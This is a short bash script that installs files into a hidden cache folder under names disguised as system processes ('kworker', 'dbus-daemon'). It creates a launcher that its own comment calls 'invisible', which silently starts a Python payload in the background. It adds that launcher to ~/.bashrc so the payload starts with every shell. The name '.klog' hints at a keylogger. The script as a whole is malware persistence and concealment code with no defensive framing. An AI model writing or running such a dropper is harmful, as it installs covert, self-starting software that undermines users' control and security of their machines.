#!/bin/bash
set -e

mkdir -p /usr/local/.cache
cp ./p.py /usr/local/.cache/kworker
cp ./core.so /usr/local/.cache/dbus-daemon
cp ./data.txt /usr/local/.cache/data.txt
chmod +x /usr/local/.cache/dbus-daemon

# Create invisible launcher
cat > ~/.local/bin/.klog <<EOF
#!/bin/bash
nohup python3 /usr/local/.cache/kworker >/dev/null 2>&1 &
EOF
chmod +x ~/.local/bin/.klog

# Auto-run on shell start
grep -qxF '~/.local/bin/.klog' ~/.bashrc || echo '~/.local/bin/.klog' >> ~/.bashrc